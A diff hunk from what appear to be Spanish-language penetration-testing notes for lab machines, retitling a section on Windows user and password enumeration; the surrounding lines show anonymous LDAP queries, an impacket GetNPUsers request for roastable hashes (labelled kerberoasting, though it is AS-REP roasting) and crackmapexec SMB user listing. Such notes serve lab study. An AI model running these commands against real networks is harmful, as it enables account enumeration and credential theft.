@@ -44,7 +44,7 @@ ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" -s su
 ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | grep sAMAccountName: --> te saca solo lista de usuarios
 
 ```
-### ENUMERAR USUARIOS/PASSWD
+### ENUMERAR USUARIOS/PASSWD WINDOWS
 ```
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 crackmapexec smb 10.10.10.161 --users  --> saca usuarios de esa ip
